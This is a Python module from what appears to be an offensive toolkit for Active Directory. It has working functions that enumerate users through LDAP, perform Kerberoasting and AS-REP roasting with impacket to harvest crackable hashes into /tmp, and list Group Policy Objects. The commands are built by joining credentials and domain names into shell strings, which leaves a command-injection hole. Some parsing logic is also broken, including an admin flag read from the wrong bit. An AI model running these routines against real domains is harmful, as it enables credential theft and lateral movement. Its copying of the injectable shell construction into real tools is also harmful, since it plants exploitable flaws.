"""Active Directory enumeration and attack tools."""

from __future__ import annotations

import asyncio
import json
import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class ADUser:
    username: str
    full_name: str = ""
    description: str = ""
    enabled: bool = True
    admin: bool = False
    spn: str = ""  # Service Principal Name (for Kerberoasting)


@dataclass
class ADGroup:
    name: str
    description: str = ""
    members: list[str] = field(default_factory=list)


@dataclass
class ADResult:
    domain: str = ""
    domain_controller: str = ""
    users: list[ADUser] = field(default_factory=list)
    groups: list[ADGroup] = field(default_factory=list)
    policies: dict[str, str] = field(default_factory=dict)
    trusts: list[str] = field(default_factory=list)
    vulnerabilities: list[dict[str, Any]] = field(default_factory=list)


async def ldap_enumerate(
    domain_controller: str,
    domain: str,
    username: str = "",
    password: str = "",
) -> ADResult:
    """Enumerate Active Directory via LDAP."""
    result = ADResult(domain=domain, domain_controller=domain_controller)

    # Build ldapsearch command
    bind_dn = f"{username}@{domain}" if username else ""
    cmd_parts = [
        "ldapsearch",
        "-x",
        "-H", f"ldap://{domain_controller}",
    ]

    if bind_dn and password:
        cmd_parts.extend(["-D", bind_dn, "-w", password])
    else:
        cmd_parts.extend(["-x"])  # Anonymous bind

    # Search for users
    cmd_parts.extend(["-b", f"DC={domain.replace('.', ',DC=')}"])
    cmd_parts.extend(["(objectClass=user)", "sAMAccountName", "displayName", "description", "userAccountControl", "servicePrincipalName"])

    cmd = " ".join(cmd_parts)
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        output = stdout.decode("utf-8", errors="replace")

        # Parse LDAP output
        current_user = None
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("# ") or not line:
                if current_user:
                    result.users.append(current_user)
                    current_user = None
                continue

            if "sAMAccountName:" in line:
                username_val = line.split(":", 1)[1].strip()
                current_user = ADUser(username=username_val)
            elif current_user and "displayName:" in line:
                current_user.full_name = line.split(":", 1)[1].strip()
            elif current_user and "description:" in line:
                current_user.description = line.split(":", 1)[1].strip()
            elif current_user and "userAccountControl:" in line:
                try:
                    uac = int(line.split(":", 1)[1].strip())
                    current_user.enabled = not bool(uac & 0x2)  # ACCOUNTDISABLE
                    current_user.admin = bool(uac & 0x200)  # NORMAL_ACCOUNT (check against admin groups)
                except ValueError:
                    pass
            elif current_user and "servicePrincipalName:" in line:
                current_user.spn = line.split(":", 1)[1].strip()

        if current_user:
            result.users.append(current_user)

        logger.info("LDAP enumeration: found %d users", len(result.users))

    except Exception as exc:
        logger.warning("LDAP enumeration failed: %s", exc)

    return result


async def kerberoast(domain: str, dc_ip: str, username: str = "", password: str = "") -> dict[str, Any]:
    """Perform Kerberoasting to extract service account hashes."""
    result = {
        "success": False,
        "service_accounts": [],
        "cracked": [],
        "method": "kerberoast",
    }

    # Use impacket's GetUserSPNs
    cmd_parts = [
        "impacket-GetUserSPNs",
        f"{domain}/{username}:{password}" if username and password else f"{domain}/anonymous",
        "-dc-ip", dc_ip,
        "-request",
        "-outputfile", "/tmp/kerberoast_hashes.txt",
    ]

    cmd = " ".join(cmd_parts)
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        output = stdout.decode("utf-8", errors="replace")

        # Parse output for service accounts
        for line in output.splitlines():
            if "SPN" in line and "@" in line:
                result["service_accounts"].append(line.strip())
                result["success"] = True

        logger.info("Kerberoast found %d service accounts", len(result["service_accounts"]))

    except Exception as exc:
        logger.warning("Kerberoast failed: %s", exc)

    return result


async def asrep_roast(domain: str, dc_ip: str) -> dict[str, Any]:
    """Perform AS-REP roasting on accounts without pre-authentication."""
    result = {
        "success": False,
        "vulnerable_accounts": [],
        "method": "asrep_roast",
    }

    cmd_parts = [
        "impacket-GetNPUsers",
        f"{domain}/",
        "-dc-ip", dc_ip,
        "-no-pass",
        "-outputfile", "/tmp/asrep_hashes.txt",
    ]

    cmd = " ".join(cmd_parts)
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        output = stdout.decode("utf-8", errors="replace")

        for line in output.splitlines():
            if "krbtgt" in line.lower() or "ASN1" in line:
                result["vulnerable_accounts"].append(line.strip())
                result["success"] = True

        logger.info("AS-REP roast found %d vulnerable accounts", len(result["vulnerable_accounts"]))

    except Exception as exc:
        logger.warning("AS-REP roast failed: %s", exc)

    return result


async def analyze_gpo(domain: str, dc_ip: str, username: str = "", password: str = "") -> dict[str, Any]:
    """Analyze Group Policy Objects for misconfigurations."""
    result = {
        "success": False,
        "gpos": [],
        "findings": [],
    }

    # Use bloodhound-cli or manual GPO analysis
    cmd_parts = [
        "ldapsearch",
        "-x",
        "-H", f"ldap://{dc_ip}",
    ]

    if username and password:
        cmd_parts.extend(["-D", f"{username}@{domain}", "-w", password])

    cmd_parts.extend([
        "-b", f"DC={domain.replace('.', ',DC=')}",
        "(objectClass=groupPolicyContainer)",
        "displayName",
        "gPCFileSysPath",
    ])

    cmd = " ".join(cmd_parts)
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
        output = stdout.decode("utf-8", errors="replace")

        current_gpo = None
        for line in output.splitlines():
            line = line.strip()
            if "displayName:" in line:
                if current_gpo:
                    result["gpos"].append(current_gpo)
                current_gpo = {"name": line.split(":", 1)[1].strip()}
            elif current_gpo and "gPCFileSysPath:" in line:
                current_gpo["path"] = line.split(":", 1)[1].strip()

        if current_gpo:
            result["gpos"].append(current_gpo)

        if result["gpos"]:
            result["success"] = True
            logger.info("GPO analysis found %d GPOs", len(result["gpos"]))

    except Exception as exc:
        logger.warning("GPO analysis failed: %s", exc)

    return result
